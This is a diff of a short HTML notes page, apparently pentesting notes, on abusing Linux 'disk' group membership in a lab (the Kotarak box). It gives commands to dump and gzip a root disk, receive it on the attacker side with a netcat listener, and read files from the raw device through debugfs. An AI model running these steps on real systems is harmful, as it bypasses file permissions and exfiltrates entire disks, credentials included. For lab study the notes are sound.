@@ -3,7 +3,12 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>Disk</title>
-</head><body>DISK group is another good group to be a part of<br/>
+</head><body>DISK group is another good group to be a part of. Things that are common to do:<br/>
+strings for certain files<br/>
+debugfs for access<br/>
+compress, dump, and download for analysis <br/>
+<br/>
+Compress, dump, and download:<br/>
 ls -la /dev/sd* and see you have rw on disks<br/>
 find the mapper of the disk you want with the 'mount' command (in this case: /dev/mapper/Kotarak--vg-root)<br/>
 Now find where the disk actually is located:<br/>
@@ -16,4 +21,9 @@ obtain disk on attacker side: nc -lvvnp &lt;port&gt; &gt; disk.img.gz<br/>
 <br/>
 gunzip -d disk.img.gz<br/>
 and now read your disk.img<br/>
-</body></html>
+<br/>
+<br/>
+<br/>
+debugfs:<br/>
+debugfs /dev/sd&lt;##&gt;<br/>
+and psuedo terminal, ls/cat/strings/etc files as normal</body></html>
